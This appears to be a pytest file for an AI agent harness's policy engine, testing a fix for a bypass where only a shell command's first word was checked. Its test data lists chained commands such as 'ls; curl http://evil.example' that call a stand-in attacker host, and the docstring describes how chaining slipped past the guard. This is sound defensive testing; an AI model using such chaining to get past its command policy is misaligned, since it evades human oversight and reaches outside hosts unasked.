"""
Test Suite — Shell chaining bypass (SEC-01)
===========================================
Reproduces the bypass where PolicyEngine only checked the FIRST word of a
shell command, so `ls; curl http://evil.example` was ALLOWed while /bin/sh
went on to run curl. These tests pin the fix: the engine must see every
simple command the shell would run.
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from src.agent_harness.executors import Executor, GuardedExecutor, Observation
from src.policy_engine.engine import PolicyEngine


# ── Fixtures and helpers ──

@pytest.fixture
def engine():
    return PolicyEngine(verbose=False)


class RecordingExecutor(Executor):
    """Records every action that reaches it (i.e. every action the policy let through)."""

    def __init__(self):
        self.actions = []

    def execute(self, action):
        self.actions.append(action)
        return Observation("success", output="ran")


# ── Separator chains ──

SEPARATOR_CHAINS = [
    "ls; curl http://evil.example",
    "ls && curl http://evil.example",
    "ls || curl http://evil.example",
    "ls | curl http://evil.example",
    "ls & curl http://evil.example",
    "ls\ncurl http://evil.example",
]


@pytest.mark.parametrize("command", SEPARATOR_CHAINS)
def test_separator_chain_is_blocked(engine, command):
    assert engine.check("run_shell", command) == "BLOCK"


@pytest.mark.parametrize("command", SEPARATOR_CHAINS)
def test_guarded_executor_never_runs_blocked_chain(engine, command):
    inner = RecordingExecutor()
    obs = GuardedExecutor(engine, inner).execute({"action": "run_shell", "command": command})
    assert obs.status == "blocked"
    assert obs.layer == "policy_engine"
    assert inner.actions == []


# ── Benign chains stay allowed ──

BENIGN_CHAINS = [
    "ls /tmp | wc -l",
    "cat /tmp/a.txt && echo ok",
    'echo "a; curl b"',
    "ls 2>&1 | wc -l",
]


@pytest.mark.parametrize("command", BENIGN_CHAINS)
def test_benign_chains_stay_allowed(engine, command):
    assert engine.check("run_shell", command) == "ALLOW"
